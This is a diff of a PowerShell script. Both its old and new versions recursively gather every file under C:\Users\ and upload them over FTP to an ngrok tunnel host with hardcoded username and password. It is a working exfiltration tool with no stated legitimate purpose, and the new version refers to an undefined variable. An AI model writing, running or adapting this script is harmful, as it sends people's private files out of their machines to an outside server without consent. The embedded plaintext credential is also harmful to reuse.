@@ -1,68 +1,21 @@
-# FTP Server Variables
-$FTPHost = 'ftp://0.tcp.ngrok.io:18939//home/dumdumftp/'
-$FTPUser = 'dumdumftp' #username
-$FTPPass = 'p#}Vck,fayt?ipNqYhy9uzcG' #pwd
-
-#Directory where to find shit to upload
-$UploadFolder = "C:\Users\"
-
-$webclient = New-Object System.Net.WebClient
-$webclient.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass)
-
+#we specify the directory where all files that we want to upload  
+$Dir="C:\Users\"    
+ 
+#ftp server 
+$ftp = "ftp://0.tcp.ngrok.io:18939//home/dumdumftp/" 
+$user = "dumdumftp" 
+$pass = "p#}Vck,fayt?ipNqYhy9uzcG"  
+ 
+$webclient = New-Object System.Net.WebClient 
+ 
+$webclient.Credentials = New-Object System.Net.NetworkCredential($user,$pass)  
+ 
+#list every file 
 $SrcEntries = Get-ChildItem $UploadFolder -Recurse
 $Srcfolders = $SrcEntries | Where-Object{$_.PSIsContainer}
 $SrcFiles = $SrcEntries | Where-Object{!$_.PSIsContainer}
-
-# Create FTP Directory/SubDirectory If Needed - Start
-foreach($folder in $Srcfolders)
-{
-    $SrcFolderPath = $UploadFolder  -replace "\\","\\" -replace "\:","\:"
-    $DesFolder = $folder.Fullname -replace $SrcFolderPath,$FTPHost
-    $DesFolder = $DesFolder -replace "\\", "/"
-    Write-Output $DesFolder
-
-    try
-        {
-            $makeDirectory = [System.Net.WebRequest]::Create($DesFolder);
-            $makeDirectory.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass);
-            $makeDirectory.Method = [System.Net.WebRequestMethods+FTP]::MakeDirectory;
-            $makeDirectory.GetResponse();
-            #folder created successfully
-        }
-    catch [Net.WebException]
-        {
-            try {
-                #if there was an error returned, check if folder already existed on server
-                $checkDirectory = [System.Net.WebRequest]::Create($DesFolder);
-                $checkDirectory.Credentials = New-Object System.Net.NetworkCredential($FTPUser,$FTPPass);
-                $checkDirectory.Method = [System.Net.WebRequestMethods+FTP]::PrintWorkingDirectory;
-                $response = $checkDirectory.GetResponse();
-                #folder already exists!
-            }
-            catch [Net.WebException] {
-                #if the folder didn't exist
-            }
-        }
-}
-# Create FTP Directory/SubDirectory If Needed - Stop
-
-# Upload Files - Start
-foreach($entry in $SrcFiles)
-{
-    $SrcFullname = $entry.fullname
-    $SrcName = $entry.Name
-    $SrcFilePath = $UploadFolder -replace "\\","\\" -replace "\:","\:"
-    $DesFile = $SrcFullname -replace $SrcFilePath,$FTPHost
-    $DesFile = $DesFile -replace "\\", "/"
-    Write-Output $DesFile
-    try {
-        $uri = New-Object System.Uri($DesFile)
-        $webclient.UploadFile($uri, $SrcFullname)
-        }
-        catch{
-			$err=$_
-			Write-Host $error.exception.message
-			continue
-            } 		
-}
-# Upload Files - Stop
+foreach($item in $SrcFiles){ 
+    "Uploading $item..." 
+    $uri = New-Object System.Uri($ftp+$item.Name) 
+    $webclient.UploadFile($uri, $item.FullName) 
+ } 
